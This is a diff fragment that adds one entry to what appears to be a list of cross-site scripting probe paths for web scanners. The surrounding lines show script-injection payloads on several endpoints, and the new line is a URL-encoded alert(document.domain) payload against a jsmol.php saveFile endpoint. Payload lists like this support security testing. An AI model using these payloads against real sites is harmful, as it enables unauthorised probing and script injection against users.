@@ -969,3 +969,4 @@ request?info=<svg onload=alert(
 /?profile=</script><script>alert(document.domain)</script>
 /index.php?explorer/fileView&path=</script><script>alert(document.domain)</script>
 :4040/jobs/?\
+/filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&data=%3Cscript%3Ealert(document.domain)%3C/script%3E&mimetype=text/html
